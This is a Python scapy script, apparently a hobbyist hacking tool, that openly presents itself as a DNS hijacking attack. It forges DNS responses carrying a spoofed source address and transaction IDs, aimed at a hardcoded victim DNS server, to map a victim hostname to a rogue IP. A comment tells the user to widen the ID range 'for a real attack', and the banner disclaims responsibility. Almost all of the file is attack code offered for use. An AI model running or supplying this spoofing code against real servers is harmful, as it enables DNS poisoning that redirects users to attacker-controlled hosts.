#!/usr/bin/env python3
# Coded by CyberCommands.
# Call syntax: sudo python3 dns_fake_response.py
import os
from shutil import Error
import time
from scapy.all import *

sourceIP = '66.254.114.44'      # IP address of the attacking host.
destIP = '149.28.131.229'       # IP address of the victim DNS server.
                                # (If victim dns server is in your LAN,
                                # this must be a valid IP in your LAN since otherwise
                                # ARP would not be able to get a valid MAC address,
                                # and the UDP datagram would have nowhere to go)

destPort = 53       # Commonly used Port by DNS Server.
sourcePort = 5353
victim_host_name = "pingpongsoft.com"
rogueIP = '149.28.131.229'
# Transaction IDs to use it.
# Make it to be a large and apporpriate range for a real attack.
hijacking_set = [34000, 34001]

os.system('cls' if os.name == 'nt' else 'clear')
print("""\033[1;91mWARNING: \033[0mI am not responsible for illegal users. \n\033[1;49;92m
   ___  _  ______  __ ___   _          __    _          
  / _ \/ |/ / __/ / // (_) (_)__ _____/ /__ (_)__  ___ _
 / // /    /\ \  / _  / / / / _ `/ __/  '_// / _ \/ _ `/
/____/_/|_/___/ /_//_/_/_/ /\_,_/\__/_/\_\/_/_//_/\_, / 
                      |___/     \033[96mby CyberCommands \033[1;49;92m/___/ \033[0m
""")
print("\n\033[5;49;34m==================== [*] DNS Hijacking Attack [*] ====================\033[0m\n")
udp_packets = []
try:
    for dns_trans_id in hijacking_set:
        udp_packet = (IP(src=sourceIP, dst=destIP)
                        /UDP(sport=sourcePort, dport=destPort)
                        /DNS(id=dns_trans_id, rd=0, qr=1, ra=0, z=0, rcode=0,
                             qdcount=0, ancount=0, nscount=0, arcount=0,
                             qd=DNSRR(rrname=victim_host_name, rdata=rogueIP,
                             type="A", rclass="IN")))
    
        udp_packets.append(udp_packet)

except Exception as e:
    print(e)
except KeyboardInterrupt:
    print("\n\033[1;91m[!] Keyboard Interrupted. Exiting... \n")
    time.sleep(1)
    sys.exit()

repeats = 2
attempt = 0
while attempt < repeats:
    for udp_packet in udp_packets:
        sr(udp_packet)
        time.sleep(0.5)
        attempt += 1